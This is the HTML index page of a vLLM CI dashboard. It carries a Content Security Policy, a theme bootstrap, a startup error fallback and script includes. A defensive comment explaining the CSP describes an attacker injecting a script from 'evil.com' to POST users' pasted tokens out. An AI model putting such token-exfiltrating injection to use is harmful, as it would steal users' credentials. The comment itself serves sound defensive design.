<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>vLLM CI Dashboard</title>

  <!--
    Content Security Policy.

    The dashboard is a single static page served from GitHub Pages. A
    network attacker who can intercept and rewrite a page load *only*
    needs to inject one ``<script src="evil.com/…">`` to steal every
    token the user ever pastes into this tab. CSP is what stops that:

      - ``default-src 'self'``          — everything defaults to same-origin.
      - ``script-src 'self' cdn.jsdelivr.net 'unsafe-inline'``
          unsafe-inline covers the pre-paint theme bootstrap below; all
          real code lives in same-origin ``assets/js/*``. The one third-
          party script is Chart.js pinned to a specific version on jsDelivr.
      - ``connect-src 'self' api.github.com api.buildkite.com``
          These two are the ONLY outbound origins the user's tokens touch.
          An injected script that tries to POST tokens to ``evil.com``
          gets blocked by the browser even before it reaches the network.
      - ``frame-ancestors 'none'``      — defeats clickjacking attempts.
      - ``base-uri 'self'``             — stops ``<base>`` injection attacks.
      - ``form-action 'self'``          — no cross-origin form POSTs.

    When you add a new outbound host (e.g. a second CI backend), extend
    ``connect-src`` explicitly — do not broaden to ``*``.
  -->
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://cdn.jsdelivr.net 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://avatars.githubusercontent.com https://github.com; font-src 'self' data:; connect-src 'self' https://api.github.com https://api.buildkite.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'">
  <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin">

  <link rel="stylesheet" href="assets/css/dashboard.css?v=1777978484">
  <script>
    // Apply theme before first paint to avoid flash
    (function(){
      var saved = localStorage.getItem('theme');
      var theme = saved || (window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark');
      document.documentElement.setAttribute('data-theme', theme);
    })();
  </script>
  <script>
    (function() {
      var issues = [];
      function esc(s) {
        return String(s == null ? '' : s)
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;');
      }
      function remember(kind, detail) {
        issues.push({
          kind: kind || 'unknown',
          detail: String(detail == null ? '' : detail),
          at: Date.now(),
        });
      }
      function renderFallback() {
        var last = document.getElementById('last-updated');
        var dash = document.getElementById('dashboard');
        var weekly = document.getElementById('weekly-summary');
        var parity = document.getElementById('parity-view');
        if (!last || !dash) return;
        if (last.textContent !== 'Loading...' && dash.textContent.trim()) return;
        if (weekly) weekly.innerHTML = '';
        if (parity) parity.innerHTML = '';
        last.textContent = 'Dashboard startup failed';
        var lines = issues.length
          ? issues.slice(0, 6).map(function(issue) {
              return issue.kind + ': ' + issue.detail;
            })
          : ['Startup timed out before the dashboard finished loading.'];
        dash.innerHTML =
          '<div style="margin:24px 0;padding:20px;border:1px solid #da3633;border-radius:12px;background:rgba(218,54,51,0.08)">' +
          '<h2 style="margin:0 0 8px;color:#ffb3b3">Dashboard startup failed</h2>' +
          '<p style="margin:0;color:var(--text,#e6edf3)">Open the browser console for the first error. A short summary is below.</p>' +
          '<pre style="margin:12px 0 0;padding:12px;background:rgba(0,0,0,0.18);border-radius:8px;white-space:pre-wrap;color:var(--text-muted,#8b949e)">' +
          esc(lines.join('\n')) +
          '</pre>' +
          '</div>';
      }
      window.__bootIssues = issues;
      window.__recordBootIssue = function(kind, detail) {
        remember(kind, detail);
      };
      window.__renderBootFallback = renderFallback;
      window.addEventListener('error', function(e) {
        if (e.target && e.target.tagName === 'SCRIPT') {
          remember('script', e.target.src || '(inline script)');
        } else {
          remember('runtime', (e.message || 'Unknown error') +
            (e.filename ? ' @ ' + e.filename + ':' + e.lineno : ''));
        }
        setTimeout(renderFallback, 0);
      }, true);
      window.addEventListener('unhandledrejection', function(e) {
        var reason = e.reason;
        remember('promise', reason && (reason.stack || reason.message) || String(reason));
        setTimeout(renderFallback, 0);
      });
      setTimeout(renderFallback, 12000);
    })();
  </script>
</head>
<body>
  <button id="theme-toggle" title="Toggle light/dark mode" aria-label="Toggle theme"></button>
  <!-- Sidebar Navigation -->
  <aside id="sidebar">
    <div class="sidebar-header">
      <h1>vLLM CI Dashboard</h1>
      <p id="last-updated">Loading...</p>
    </div>
    <nav id="sidebar-nav">
      <button class="nav-btn active" data-tab="projects">
        <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2 2.5A2.5 2.5 0 014.5 0h8.75a.75.75 0 01.75.75v12.5a.75.75 0 01-.75.75h-2.5a.75.75 0 110-1.5h1.75v-2h-8a1 1 0 00-.714 1.7.75.75 0 01-1.072 1.05A2.495 2.495 0 012 11.5v-9z"/></svg>
        Home
      </button>
      <!-- CI sections are registered dynamically by registerCISection() -->
      <div id="ci-nav-anchor"></div>
    </nav>
  </aside>

  <!-- Main Content -->
  <main id="main-content">
    <div id="tab-projects" class="tab-panel active">
      <section id="weekly-summary"></section>
      <main id="dashboard"></main>
      <section id="parity-view"></section>
    </div>

    <!-- CI tab panels are created dynamically by registerCISection() -->
  </main>

  <footer>
    <p>Data collected via <a href="https://github.com/AndreasKaratzas/vllm-ci-dashboard">project-dashboard</a></p>
  </footer>

  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.7/dist/chart.umd.min.js"></script>
  <!-- token-vault MUST load before auth.js so auth can unlock it at sign-in. -->
  <script src="assets/js/token-vault.js?v=1777978484"></script>
  <script src="assets/js/utils.js?v=1777978484"></script>
  <script src="assets/js/auth.js?v=1777978484"></script>
  <script src="assets/js/ci-health.js?v=1777978484"></script>
  <script src="assets/js/ci-analytics.js?v=1777978484"></script>
  <script src="assets/js/ci-queue.js?v=1777978484"></script>
  <script src="assets/js/ci-hotness.js?v=1777978484"></script>
  <script src="assets/js/ci-omni.js?v=1777978484"></script>
  <script src="assets/js/dashboard.js?v=1777978484"></script>
  <script src="assets/js/ci-testbuild.js?v=1777978484"></script>
  <script src="assets/js/ci-ready.js?v=1777978484"></script>
  <script src="assets/js/ci-admin.js?v=1777978484"></script>
  <script>
    (function(){
      var btn = document.getElementById('theme-toggle');
      function updateIcon() {
        btn.textContent = document.documentElement.getAttribute('data-theme') === 'dark' ? '\u2600\uFE0F' : '\uD83C\uDF19';
      }
      updateIcon();
      btn.onclick = function() {
        var current = document.documentElement.getAttribute('data-theme');
        var next = current === 'dark' ? 'light' : 'dark';
        localStorage.setItem('theme', next);
        location.reload();
      };
      window.matchMedia('(prefers-color-scheme: light)').addEventListener('change', function(e) {
        if (!localStorage.getItem('theme')) {
          var theme = e.matches ? 'light' : 'dark';
          document.documentElement.setAttribute('data-theme', theme);
          updateIcon();
        }
      });
    })();
  </script>
</body>
</html>
